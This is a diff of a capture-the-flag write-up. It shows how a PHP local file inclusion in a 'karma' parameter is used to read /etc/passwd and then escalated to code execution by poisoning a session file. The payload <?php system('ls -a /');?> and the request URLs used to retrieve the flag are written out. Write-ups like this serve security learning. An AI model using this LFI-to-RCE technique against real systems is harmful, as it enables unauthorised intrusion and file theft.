@@ -47,7 +47,7 @@ Finally, ```include($_GET["karma"]);``` causes the PHP interpreter to include an
 
 ----------
 
-### (2) LFI
+### (2) LFI:
 
 After understanding the source code, I tried passing ``/etc/passwd`` to the **karma** parameter, and the content was printed out:
 
@@ -61,4 +61,50 @@ I need to achieve RCE because I won't be able to know the name of the secret fil
 
 ----------
 
-### (3) LFI to RCE
+### (3) LFI to RCE:
+
+According to the following line of the source code:
+```php
+$_SESSION["boruto"]=$_GET["karma"];
+```
+The value of the **karma** parameter is stored in the session file on the server which was created when the session was started.
+
+After searching a little bit, I found that ```/tmp/``` directory is one of the common locations to store session data files in the following format:
+ ```/tmp/sess_[PHPSESSID]```
+
+![image](https://user-images.githubusercontent.com/70543460/209961297-61a8d059-977c-4828-afb1-b77aa29e90cf.png)
+
+So, my sessiod data file was: ```/tmp/sess_26ef471f0ed2b7e54244bd9b0e6e1641```
+![image](https://user-images.githubusercontent.com/70543460/209962272-0ac2426b-060d-495e-a748-163bffb66182.png)
+
+And to test the following line:
+```php
+$_SESSION["boruto"]=$_GET["karma"];
+```
+I passed **anything** as a value to the **karma** parameter:
+```
+http://44.200.237.73/?karma=anything
+```
+Then I opened my session data file:
+```http://44.200.237.73/?karma=/tmp/sess_26ef471f0ed2b7e54244bd9b0e6e1641```
+
+And found the data that I passed as a value to the **karma** parameter:
+![image](https://user-images.githubusercontent.com/70543460/209962814-8d52e296-335b-4534-9a66-0d9534389f73.png)
+
+Accordingly, I passed a php code that executes ```ls -a /``` as a value to the **karma** parameter:
+
+```http://44.200.237.73/?karma=<?php system('ls -a /');?>```
+
+Then I opened my session data file:
+
+```http://44.200.237.73/?karma=/tmp/sess_26ef471f0ed2b7e54244bd9b0e6e1641```
+
+Bingo! I was able to achieve RCE and I got the name of the secret file which is located in the root ```/``` directory:
+
+![image](https://user-images.githubusercontent.com/70543460/209963269-11c5a430-b0a5-4c00-8742-2418debaaea2.png)
+
+Finally, I got that flag:
+```http://44.200.237.73/?karma=/seCretJutsuToKillBorUtoKun.txt```
+
+![image](https://user-images.githubusercontent.com/70543460/209963922-1350f38a-ab69-458d-8f1d-8d52d4f933e7.png)
+
